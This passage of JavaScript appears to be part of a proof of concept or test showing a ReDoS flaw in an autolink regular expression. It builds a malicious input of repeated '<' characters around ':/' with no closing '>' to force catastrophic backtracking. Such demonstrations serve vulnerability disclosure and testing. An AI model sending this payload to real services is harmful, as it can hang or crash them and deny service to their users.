  //    the `--regexp-backtracks-before-fallback` flag). The Node.js engine will detect this 
  //    excessive backtracking and throw a RegexBacktrackingLimitError, demonstrating the ReDoS.

  const n = 200;

  // Constructing malicious input:
  // '<' starts the potential autolink.
  // '<'.repeat(n) provides a long sequence of characters matching [^ >].
  // ':/' is the literal separator required by the regex.
  // '<'.repeat(n) provides another long sequence matching [^ >].
  // Crucially, we OMIT the final '>' to force failure and backtracking.
  const maliciousInput = `<` + `<`.repeat(n) + `:/` + `<`.repeat(n);

